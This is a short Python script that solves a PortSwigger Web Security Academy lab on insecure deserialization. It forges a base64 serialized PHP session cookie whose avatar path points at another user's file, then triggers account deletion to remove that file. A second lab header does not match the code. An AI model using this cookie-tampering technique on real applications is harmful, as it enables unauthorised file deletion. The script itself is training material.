# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization
# Lab: Using application functionality to exploit insecure deserialization
# Difficulty: PRACTITIONER

# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
# Lab: Modifying serialized objects
# Difficulty: APPRENTICE

import requests, base64 
from pwn import log
from urllib.parse import unquote 

sub = '0a5e004d03edd003807fcbc700170069'
url = f'https://{sub}.web-security-academy.net'

s = requests.session()

def login():
    r = s.post(f'{url}/login', data={'username': 'wiener', 'password': 'peter'})
    log.info(f'Logging in as wiener: {r.status_code}')
    
def exploit():
    session_cookie = s.cookies.get('session')
    log.info(f'Cookie is serialized PHP object: {base64.b64decode(unquote(session_cookie))}')
    
    s.cookies.set('session', 'Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpZTl2cXNyZzJzcGpqZ2psMGYwOXBtY3FoZGhmOXZ3aSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9')
    
    r = s.post(f'{url}/my-account/delete')
    
    if r.status_code != 302:
        log.error('Failed to delete my account')
        return
    
    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.info('Lab not solved yet')
    
if __name__ == '__main__':
    login()
    exploit()